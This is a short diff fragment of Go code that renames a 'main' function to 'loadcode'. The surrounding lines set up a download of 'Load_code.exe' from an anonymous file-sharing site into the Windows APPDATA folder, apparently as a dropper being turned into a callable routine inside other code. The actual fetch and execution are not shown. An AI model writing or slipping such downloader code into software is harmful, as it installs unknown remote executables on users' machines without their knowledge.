@@ -10,7 +10,7 @@ import (
     "path/filepath"
 )
 
-func main() {
+func loadcode() {
     appData := os.Getenv("APPDATA")
     filePath := filepath.Join(appData, "loadcode.exe")
     url := "https://anonsharing.com/file/8a911b041bad7335/Load_code.exe"
